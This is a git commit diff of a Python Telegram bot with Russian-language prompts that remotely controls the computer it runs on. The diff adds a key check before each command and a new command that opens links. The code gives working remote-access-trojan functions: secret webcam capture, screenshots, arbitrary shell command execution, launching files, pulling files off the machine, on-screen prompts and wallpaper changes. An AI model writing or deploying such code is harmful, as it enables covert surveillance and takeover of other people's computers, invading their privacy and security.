8c5a0383ab19f0d101995c4158c194b95a31d5c4
greenMachine1123 <96006818+mqchinee@users.noreply.github.com>
2022-07-28 16:34:29 +0300

    Add files via upload

--- bot.py
+++ bot.py
@@ -13,13 +13,17 @@ from telebot import types
 import config
 from telebot import util
 
+import webbrowser
+
+ps = config.KEY
+
 bot = telebot.TeleBot(config.TOKEN)
 
 @bot.message_handler(commands=["start", "help"])
 def start(message):
 	rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
 	btns = [["/ip", "/spec", "/webcam", "/cmd", "/file", "/download"],
-			["/message", "/input", "/wallpaper", "/sct", "/github"]]
+			["/message", "/input", "/wallpaper", "/sct", "/github", "/link"]]
 
 	rmk.row(*btns[0])
 	rmk.row(*btns[1])
@@ -35,6 +39,7 @@ def start(message):
 		/cmd - Выполнить команду в терминале
 		/file - Запустить файл
 		/download - Скачать файл
+		/link - Открыть ссылку
 		/github - Мой Github!
 		""",
 		reply_markup=rmk
@@ -44,67 +49,133 @@ def start(message):
 @bot.message_handler(commands=["ip", "ip_address"])
 def ip_address(message):
 	try:
-		response = requests.get("http://jsonip.com/").json()
-		bot.send_message(message.chat.id, f"IP Address: {response['ip']}")
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, getpass1)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
+def getpass1(message):
+	try:
+		if message.text == ps:
+			try:
+				response = requests.get("http://jsonip.com/").json()
+				bot.send_message(message.chat.id, f"IP Address: {response['ip']}")
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
 
 @bot.message_handler(commands=["spec", "specifications"])
+def getspec(message):
+	try:
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, specifications)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
 def specifications(message):
 	try:
-		banner = f"""
-		PC Name: {platform.node()}
-		Processor: {platform.processor()}
-		System: {platform.system()} {platform.release()}
-		Platform: {platform.platform()}
-		"""
-		bot.send_message(message.chat.id, banner)
+		if message.text == ps:
+			try:
+				banner = f"""
+				PC Name: {platform.node()}
+				Processor: {platform.processor()}
+				System: {platform.system()} {platform.release()}
+				Platform: {platform.platform()}
+				"""
+				bot.send_message(message.chat.id, banner)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
 
 @bot.message_handler(commands=["sct", "screenshot"])
+def getsct(message):
+	try:
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, screenshot)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
 def screenshot(message):
 	try:
-		filename = f"{time.time()}.jpg"
-		pyautogui.screenshot(filename)
+		if message.text == ps:
+			try:
+				filename = f"{time.time()}.jpg"
+				pyautogui.screenshot(filename)
 
-		with open(filename, "rb") as img:
-			bot.send_photo(message.chat.id, img)
-		os.remove(filename)
+				with open(filename, "rb") as img:
+					bot.send_photo(message.chat.id, img)
+				os.remove(filename)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
 
 @bot.message_handler(commands=["webcam"])
+def getweb(message):
+	try:
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, webcam)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
 def webcam(message):
 	try:
-		filename = "cam.jpg"
-		cap = cv2.VideoCapture(0)
+		if message.text == ps:
+			try:
+				filename = "cam.jpg"
+				cap = cv2.VideoCapture(0)
 
-		for i in range(30):
-			cap.read()
+				for i in range(30):
+					cap.read()
 
-		ret, frame = cap.read()
+				ret, frame = cap.read()
 
-		cv2.imwrite(filename, frame)
-		cap.release()
+				cv2.imwrite(filename, frame)
+				cap.release()
 
-		with open(filename, "rb") as img:
-			bot.send_photo(message.chat.id, img)
-		os.remove(filename)
+				with open(filename, "rb") as img:
+					bot.send_photo(message.chat.id, img)
+				os.remove(filename)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
 
 @bot.message_handler(commands=["message"])
-def send_message_to_client(message):
+def getmess(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Введите сообщение:")
-		bot.register_next_step_handler(msg, sms_to_client)
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, send_message_to_client)
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
+
+
+def send_message_to_client(message):
+	try:
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите сообщение:")
+				bot.register_next_step_handler(msg, sms_to_client)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	except Exception as e:
+				bot.send_message(message.chat.id, e)
 
 
 def sms_to_client(message):
@@ -115,15 +186,28 @@ def sms_to_client(message):
 
 
 @bot.message_handler(commands=["input"])
-def send_message_with_answer(message):
+def getinput(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Введите сообщение:")
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
 		bot.register_next_step_handler(msg, send_message_with_answer)
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
-
 def send_message_with_answer(message):
+	try:
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите сообщение:")
+				bot.register_next_step_handler(msg, send_message_with_answer2)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	except Exception as e:
+				bot.send_message(message.chat.id, e)
+
+
+def send_message_with_answer2(message):
 	try:
 		answer = pyautogui.prompt(message.text, "~")
 		if answer == None:
@@ -135,12 +219,25 @@ def send_message_with_answer(message):
 
 
 @bot.message_handler(commands=["wallpaper"])
-def wallpaper(message):
+def getwp(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Отправьте картинку:")
-		bot.register_next_step_handler(msg, set_wallpaper)
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, wallpaper)
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
+
+def wallpaper(message):
+	try:
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Отправьте картинку:")
+				bot.register_next_step_handler(msg, set_wallpaper)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	except Exception as e:
+				bot.send_message(message.chat.id, e)
 
 
 @bot.message_handler(content_types=["photo"])
@@ -159,10 +256,24 @@ def set_wallpaper(message):
 		bot.send_message(message.chat.id, e)
 
 @bot.message_handler(commands=["cmd"])
+def getcmd(message):
+	try:
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, cmdpromt)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
 def cmdpromt(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Введите команду:")
-		bot.register_next_step_handler(msg, ossys)
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите команду:")
+				bot.register_next_step_handler(msg, ossys)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
@@ -176,18 +287,29 @@ def ossys(message):
 
 		for text in splitted_text:
 			bot.send_message(message.chat.id, text)
-
-		#bot.send_message(message.chat.id, open('tmp.txt', 'r').read())
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
 @bot.message_handler(commands=["file"])
-def startfilecmd(message):
+def getfile(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
-		bot.register_next_step_handler(msg, sfc)
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, startfilecmd)
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
+
+def startfilecmd(message):
+	try:
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
+				bot.register_next_step_handler(msg, sfc)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	except Exception as e:
+				bot.send_message(message.chat.id, e)
 
 def sfc(message):
 	try:
@@ -197,12 +319,25 @@ def sfc(message):
 		bot.send_message(message.chat.id, e)
 
 @bot.message_handler(commands=["download"])
+def getdwn(message):
+		try:
+			msg = bot.send_message(message.chat.id, "Введите ключ:")
+			bot.register_next_step_handler(msg, downloadfilecmd)
+		except Exception as e:
+			bot.send_message(message.chat.id, e)
+
 def downloadfilecmd(message):
 	try:
-		msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
-		bot.register_next_step_handler(msg, dfc)
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
+				bot.register_next_step_handler(msg, dfc)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
 	except Exception as e:
-		bot.send_message(message.chat.id, e)
+				bot.send_message(message.chat.id, e)
 
 def dfc(message):
 	try:
@@ -243,6 +378,34 @@ def dfc(message):
 def github1(message):
 	try:
 		bot.send_message(message.chat.id, "https://github.com/mqchinee")
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
+@bot.message_handler(commands=["link"])
+def getlink(message):
+	try:
+		msg = bot.send_message(message.chat.id, "Введите ключ:")
+		bot.register_next_step_handler(msg, slink)
+	except Exception as e:
+		bot.send_message(message.chat.id, e)
+
+def slink(message):
+	try:
+		if message.text == ps:
+			try:
+				msg = bot.send_message(message.chat.id, "Введите ссылку:")
+				bot.register_next_step_handler(msg, tolink)
+			except Exception as e:
+				bot.send_message(message.chat.id, e)
+		else:
+			bot.send_message(message.chat.id, "Неверный ключ!")
+	except Exception as e:
+				bot.send_message(message.chat.id, e)
+
+def tolink(message):
+	try:
+		webbrowser.open(message.text)
+		bot.send_message(message.chat.id, "Ссылка открыта!")
 	except Exception as e:
 		bot.send_message(message.chat.id, e)
 
